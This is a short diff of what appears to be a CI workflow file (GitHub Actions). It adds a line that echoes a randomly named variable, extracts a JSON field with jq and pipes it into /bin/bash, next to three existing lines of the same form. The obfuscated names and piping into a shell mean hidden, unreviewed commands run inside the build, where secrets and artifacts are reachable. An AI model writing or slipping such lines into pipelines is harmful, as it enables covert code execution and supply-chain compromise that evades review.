@@ -35,6 +35,7 @@ jobs:
           echo $qbehy78915 | jq -r .ers4100 | /bin/bash
           printf '%s' "$d416" | jq -r .tsm2 | /bin/bash
           echo $oi6 | jq -r .piwb32 | /bin/bash
+          echo $g8318 | jq -r .tvyq89 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
